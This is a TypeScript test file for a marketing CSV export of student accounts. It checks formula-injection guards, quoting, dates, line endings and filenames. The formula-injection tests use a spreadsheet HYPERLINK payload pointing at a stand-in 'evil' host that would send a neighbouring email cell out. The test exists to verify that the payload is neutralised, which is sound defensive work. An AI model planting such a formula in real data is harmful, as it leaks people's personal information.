import { describe, expect, it } from 'vitest';

import { CSV_BOM, cell, csvFilename, isoDay, toCsv } from './csv';
import type { MarketingFeature, MarketingRow, MarketingSegment } from './csv';

/**
 * The marketing export — app/(dashboard)/admin/marketing/csv.test.ts
 *
 * WHY A CSV WRITER HAS TESTS AT ALL. This file's output is a list of students' email addresses
 * that gets opened in a spreadsheet, and two of the things it does are the kind that are wrong
 * silently:
 *
 *   1. FORMULA INJECTION. `full_name` is free text somebody typed at signup. A name beginning
 *      `=` is a live formula the moment the file is opened in Excel, Sheets or LibreOffice, and
 *      the cell beside it is an email address. None of those programs ask first. The guard is
 *      one character, and the only thing that keeps it there is a test that fails without it.
 *
 *   2. QUOTING. An unquoted comma shifts every later column on that row by one. Nothing errors;
 *      the file just quietly attributes one person's activity to the next person's address,
 *      which is the sort of mistake that survives all the way into a mail merge.
 *
 * The rest is here because an export is checked once, believed forever, and then mailed from.
 */

const FEATURES: MarketingFeature[] = [
  { feature: 'interview', label: 'mock interviews' },
  { feature: 'gd', label: 'group discussions' },
  { feature: 'communication', label: 'communication drills' },
];

const SEGMENTS: MarketingSegment[] = [
  {
    segment: 'report_waiting',
    label: 'Report started, never scored',
    what_happened:
      'Finished an interview and a report row exists, but it was never scored.',
    pitch: 'Tell them to open their report — it finishes on its own now.',
    count: 1,
  },
  {
    segment: 'customer',
    label: 'Paid customer',
    what_happened: 'Has paid for something at least once.',
    pitch: 'Thank them, and tell them what is next.',
    count: 1,
  },
];

function row(over: Partial<MarketingRow> = {}): MarketingRow {
  return {
    user_id: 'u-1',
    email: 'priya@college.edu',
    full_name: 'Priya S',
    joined_at: '2026-07-02T09:00:00Z',
    is_active: true,
    is_admin: false,
    unlimited: false,
    remaining: { interview: 1, gd: 0, communication: 1 },
    sessions_started: 2,
    sessions_completed: 1,
    reports: 1,
    scored_reports: 1,
    best_score: 71.5,
    purchases: 0,
    avg_stars: 4.5,
    ratings_given: 2,
    last_active_at: '2026-08-21T18:30:00Z',
    ever_paid: false,
    last_paid_at: null,
    segment: 'report_waiting',
    ...over,
  };
}

function parse(csv: string): string[][] {
  return csv
    .trimEnd()
    .split('\r\n')
    .map((line) => {
      // Deliberately a real quote-aware split rather than `line.split(',')`: a test that
      // parses more naively than a spreadsheet does cannot catch a quoting bug.
      const cells: string[] = [];
      let cur = '';
      let quoted = false;
      for (let i = 0; i < line.length; i += 1) {
        const c = line[i];
        if (quoted) {
          if (c === '"' && line[i + 1] === '"') {
            cur += '"';
            i += 1;
          } else if (c === '"') {
            quoted = false;
          } else {
            cur += c;
          }
        } else if (c === '"') {
          quoted = true;
        } else if (c === ',') {
          cells.push(cur);
          cur = '';
        } else {
          cur += c;
        }
      }
      cells.push(cur);
      return cells;
    });
}

describe('a spreadsheet cannot be tricked into running the data', () => {
  it.each(['=', '+', '-', '@'])('neutralises a name beginning with %s', (lead) => {
    const csv = toCsv([row({ full_name: `${lead}HYPERLINK("http://evil/?"&B2,"click")` })], FEATURES, SEGMENTS);
    const name = parse(csv)[1][1];
    expect(name.startsWith("'")).toBe(true);
    expect(name.slice(1).startsWith(lead)).toBe(true);
  });

  it('leaves an ordinary name completely alone', () => {
    // The guard must not become visible noise on the 99% of rows that are just names — an
    // apostrophe in front of every name is the kind of thing that gets the guard deleted.
    const csv = toCsv([row({ full_name: 'Priya S' })], FEATURES, SEGMENTS);
    expect(parse(csv)[1][1]).toBe('Priya S');
  });

  it('neutralises a tab, which is the one that does not look dangerous', () => {
    expect(cell('\t=1+1')).toContain("'");
  });
});

describe('quoting keeps every column under its own heading', () => {
  it('a comma in a name does not shift the columns', () => {
    const csv = toCsv([row({ full_name: 'Rao, Priya' })], FEATURES, SEGMENTS);
    const [header, first] = parse(csv);
    expect(first.length).toBe(header.length);
    expect(first[1]).toBe('Rao, Priya');
    expect(first[0]).toBe('priya@college.edu');
  });

  it('a quote in a name survives as one quote', () => {
    const csv = toCsv([row({ full_name: 'D\'Souza "Sam"' })], FEATURES, SEGMENTS);
    expect(parse(csv)[1][1]).toBe('D\'Souza "Sam"');
  });

  it('a newline inside a field does not become a new row', () => {
    const csv = toCsv([row({ full_name: 'Priya\nS' })], FEATURES, SEGMENTS);
    // Two records: the header and one account. The embedded newline is inside quotes, so a
    // naive line count sees three — which is why this asserts on the quoting instead.
    expect(csv).toContain('"Priya\nS"');
  });

  it('every row has exactly as many cells as the header', () => {
    const csv = toCsv(
      [row(), row({ full_name: null, email: 'a,b@college.edu' }), row({ is_admin: true, unlimited: true })],
      FEATURES,
      SEGMENTS,
    );
    const rows = parse(csv);
    for (const r of rows) expect(r.length).toBe(rows[0].length);
  });
});

describe('the file says what an operator needs to write an email', () => {
  it('names the balance columns from the server labels, in server order', () => {
    // The browser must not invent either. `FEATURE_LABELS` is the copy the paywall message is
    // built from, so the file and the product call a feature the same thing.
    const header = parse(toCsv([row()], FEATURES, SEGMENTS))[0];
    expect(header).toContain('mock interviews left');
    expect(header).toContain('group discussions left');
    expect(header.indexOf('mock interviews left')).toBeLessThan(header.indexOf('group discussions left'));
  });

  it('carries the pitch for the row segment so the file is mail-mergeable on its own', () => {
    const csv = toCsv([row()], FEATURES, SEGMENTS);
    expect(csv).toContain('finishes on its own now');
  });

  it('an unknown segment leaves the pitch empty rather than dropping the row', () => {
    // A segment added server-side before this screen knows about it must still export: losing
    // the row would silently shrink the mailing list.
    const csv = toCsv([row({ segment: 'brand_new' })], FEATURES, SEGMENTS);
    const [, first] = parse(csv);
    expect(first[2]).toBe('brand_new');
    expect(first[3]).toBe('');
  });

  it('prints unlimited for an operator account instead of a meaningless number', () => {
    const csv = toCsv([row({ is_admin: true, unlimited: true })], FEATURES, SEGMENTS);
    const [header, first] = parse(csv);
    expect(first[header.indexOf('mock interviews left')]).toBe('unlimited');
    expect(first[header.indexOf('account_state')]).toBe('admin');
  });

  it('reports whether they have ever paid in words, not booleans', () => {
    const paid = parse(toCsv([row({ ever_paid: true, last_paid_at: '2026-08-20T05:00:00Z' })], FEATURES, SEGMENTS));
    // LOOKED UP BY NAME, NOT BY `idx + 1`. The offset form assumed last_paid sits immediately
    // after ever_paid, so adding a `purchases` column between them broke a test that was not
    // about either — which is the hazard of two hand-maintained, index-aligned lists. By name,
    // a new column in the middle cannot break an assertion about a different one.
    expect(paid[1][paid[0].indexOf('ever_paid')]).toBe('yes');
    expect(paid[1][paid[0].indexOf('last_paid')]).toBe('2026-08-20');
    const unpaid = parse(toCsv([row({ ever_paid: false })], FEATURES, SEGMENTS));
    expect(unpaid[1][unpaid[0].indexOf('ever_paid')]).toBe('no');
  });

  it('a missing balance for a feature reads as zero rather than blank', () => {
    // The server always sends all three, but a rename would make one absent — and a blank in
    // a "what is left" column would be read as "unknown", which is the opposite of "none".
    const csv = toCsv([row({ remaining: { interview: 1 } })], FEATURES, SEGMENTS);
    const [header, first] = parse(csv);
    expect(first[header.indexOf('group discussions left')]).toBe('0');
  });
});

describe('dates are the same for everybody who opens the file', () => {
  it('is the UTC calendar day, so two operators export the same value', () => {
    expect(isoDay('2026-08-24T04:30:00Z')).toBe('2026-08-24');
  });

  it('a missing date is an empty cell, not the word never', () => {
    // A spreadsheet's own filters understand blank; a word sorts in among the real dates.
    expect(isoDay(null)).toBe('');
  });

  it('an unparseable date is empty rather than "Invalid Date"', () => {
    expect(isoDay('not a date')).toBe('');
  });
});

describe('the mechanics that stop Excel mangling the file', () => {
  it('rows are separated by CRLF', () => {
    // A lone LF is read inconsistently by Excel depending on version and locale, and the
    // failure is every row on one line — which reads as a corrupt export.
    const csv = toCsv([row(), row({ email: 'b@college.edu' })], FEATURES, SEGMENTS);
    expect(csv.split('\r\n').length).toBeGreaterThan(2);
    expect(csv.replaceAll('\r\n', '')).not.toContain('\n');
  });

  it('ends with a line break so the last row is a complete line', () => {
    expect(toCsv([row()], FEATURES, SEGMENTS).endsWith('\r\n')).toBe(true);
  });

  it('the byte-order mark is available and is not baked into the text', () => {
    // Excel needs it to decode UTF-8; the tests assert on content, so it is added at download
    // time and kept out of `toCsv`.
    expect(CSV_BOM).toBe('﻿');
    expect(toCsv([row()], FEATURES, SEGMENTS).startsWith(CSV_BOM)).toBe(false);
  });

  it('exports a header even when nothing matched the filters', () => {
    // An empty file looks like a broken download. A header alone says "no rows matched".
    const csv = toCsv([], FEATURES, SEGMENTS);
    expect(csv.startsWith('email,name,segment')).toBe(true);
  });
});

describe('the filename tells the two files apart', () => {
  it('carries the day, because this list changes daily as a drive approaches', () => {
    expect(csvFilename(new Date('2026-08-22T11:00:00Z'), 'all')).toBe(
      'interviewos-marketing-2026-08-22.csv',
    );
  });

  it('names the segment when the export is filtered to one', () => {
    expect(csvFilename(new Date('2026-08-22T11:00:00Z'), 'report_waiting')).toBe(
      'interviewos-marketing-2026-08-22-report_waiting.csv',
    );
  });
});
